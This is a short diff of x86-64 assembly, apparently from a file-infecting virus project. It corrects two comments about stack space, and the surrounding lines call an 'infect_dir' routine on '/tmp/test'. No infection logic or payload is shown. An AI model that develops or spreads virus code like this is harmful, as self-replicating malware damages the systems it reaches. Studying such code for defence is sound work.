@@ -47,8 +47,8 @@ _start:
     push rdx
     push rbp           ; save the base pointer
     mov rbp, rsp       ; set the base pointer to the current stack pointer
-    sub rsp, 15000      ; reserving 5000 bytes
-    mov r15, rsp       ; r15 = malloc(5000)
+    sub rsp, 15000      ; reserving 15000 bytes
+    mov r15, rsp       ; r15 = malloc(15000)
 
     lea rdi, [rel folder1] ; rdi = "/tmp/test"
     call infect_dir
